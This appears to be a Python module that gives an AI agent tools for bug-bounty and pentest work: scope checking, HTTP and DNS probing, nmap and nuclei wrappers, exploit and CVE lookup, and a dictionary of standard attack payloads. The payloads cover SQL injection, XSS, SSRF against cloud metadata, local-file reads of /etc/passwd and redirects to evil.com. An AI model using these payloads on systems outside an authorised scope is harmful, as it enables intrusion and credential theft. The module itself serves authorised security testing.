"""Security tools for bug bounty / pentest agent loops."""
from __future__ import annotations

import asyncio
import json
import re
import shutil
import socket
from typing import Any
from urllib.parse import urlparse

import httpx

from app.services.cve_service import lookup_cve
from app.services.rag_service import rag_service
from app.tools.web_search import google_search


# ── Scope validation ──────────────────────────────────────────────────────────

def check_scope(url: str, scope_domains: list[str]) -> dict:
    """Verify URL is in bug bounty scope."""
    if not scope_domains:
        return {"in_scope": True, "reason": "No scope restrictions configured"}

    try:
        parsed = urlparse(url if "://" in url else f"https://{url}")
        host = (parsed.hostname or "").lower()
    except Exception:
        return {"in_scope": False, "reason": "Invalid URL"}

    for domain in scope_domains:
        d = domain.lower().strip().lstrip("*.")
        if host == d or host.endswith(f".{d}"):
            return {"in_scope": True, "host": host, "matched_scope": domain}

    return {"in_scope": False, "host": host, "reason": f"Host not in scope: {scope_domains}"}


# ── HTTP / DNS ────────────────────────────────────────────────────────────────

async def http_probe(url: str, method: str = "GET", follow_redirects: bool = True) -> dict:
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    async with httpx.AsyncClient(
        timeout=20,
        follow_redirects=follow_redirects,
        verify=False,
    ) as client:
        try:
            resp = await client.request(method.upper(), url)
            headers = dict(resp.headers)
            security_headers = {
                k: headers.get(k)
                for k in (
                    "strict-transport-security",
                    "content-security-policy",
                    "x-frame-options",
                    "x-content-type-options",
                    "permissions-policy",
                )
                if headers.get(k)
            }
            missing = [
                h for h in (
                    "strict-transport-security",
                    "content-security-policy",
                    "x-frame-options",
                    "x-content-type-options",
                )
                if h not in {k.lower() for k in headers}
            ]
            body_preview = resp.text[:2000] if resp.text else ""
            return {
                "url": str(resp.url),
                "status_code": resp.status_code,
                "headers": {k: v for k, v in list(headers.items())[:30]},
                "security_headers": security_headers,
                "missing_security_headers": missing,
                "body_preview": body_preview,
                "content_length": len(resp.content),
            }
        except Exception as exc:
            return {"url": url, "error": str(exc)}


async def dns_resolve(hostname: str) -> dict:
    hostname = hostname.strip().lstrip("https://").split("/")[0].split(":")[0]
    try:
        loop = asyncio.get_event_loop()
        infos = await loop.run_in_executor(None, socket.getaddrinfo, hostname, None)
        ips = sorted({item[4][0] for item in infos})
        return {"hostname": hostname, "addresses": ips}
    except Exception as exc:
        return {"hostname": hostname, "error": str(exc)}


# ── Payload generation (bug bounty) ─────────────────────────────────────────

PAYLOAD_TEMPLATES = {
    "sqli": [
        "' OR '1'='1",
        "' OR 1=1--",
        "1' ORDER BY 10--",
        "' UNION SELECT NULL,NULL--",
        "admin'--",
        "1; WAITFOR DELAY '0:0:5'--",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "'-alert(1)-'",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
    ],
    "ssrf": [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]",
        "file:///etc/passwd",
    ],
    "lfi": [
        "../../../etc/passwd",
        "....//....//etc/passwd",
        "/proc/self/environ",
        "php://filter/convert.base64-encode/resource=index.php",
    ],
    "open_redirect": [
        "//evil.com",
        "https://evil.com",
        "/\\evil.com",
        "////evil.com",
    ],
    "idor": [
        "id=1", "id=2", "id=0", "id=-1", "id=99999",
    ],
}


def generate_payloads(vuln_type: str, target_param: str = "") -> dict:
    vuln_type = vuln_type.lower()
    payloads = PAYLOAD_TEMPLATES.get(vuln_type, PAYLOAD_TEMPLATES.get("sqli", []))
    if target_param:
        payloads = [f"{target_param}={p}" for p in payloads]
    return {"vuln_type": vuln_type, "payloads": payloads, "count": len(payloads)}


# ── CLI tool wrappers ─────────────────────────────────────────────────────────

async def run_nuclei(url: str, severity: str = "critical,high,medium") -> dict:
    if not shutil.which("nuclei"):
        return {"error": "nuclei not installed", "install": "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"}
    cmd = ["nuclei", "-u", url, "-severity", severity, "-silent", "-jsonl", "-timeout", "30"]
    proc = await asyncio.create_subprocess_exec(
        *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=120)
    findings = []
    for line in stdout.decode(errors="replace").splitlines():
        try:
            findings.append(json.loads(line))
        except json.JSONDecodeError:
            pass
    return {"url": url, "findings_count": len(findings), "findings": findings[:20]}


async def run_nmap(host: str, ports: str = "80,443,8080,8443") -> dict:
    if not shutil.which("nmap"):
        return {"error": "nmap not installed"}
    host = urlparse(host if "://" in host else f"http://{host}").hostname or host
    cmd = ["nmap", "-sV", "-T4", "-p", ports, host]
    proc = await asyncio.create_subprocess_exec(
        *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=120)
    return {"host": host, "output": stdout.decode(errors="replace")[:8000]}


async def search_exploit_db(query: str) -> dict:
    """Search for public exploit writeups via web search."""
    results = await google_search(f"{query} exploit CVE site:exploit-db.com OR site:github.com", num_results=5)
    return {"query": query, "results": results}


async def knowledge_search(query: str, top_k: int = 5) -> dict:
    chunks = rag_service.retrieve(query, top_k=top_k)
    return {
        "query": query,
        "results": [
            {"content": c.content[:500], "score": c.score, "source": c.source}
            for c in chunks
        ],
    }


async def cve_lookup(cve_id: str) -> dict:
    return await lookup_cve(cve_id)
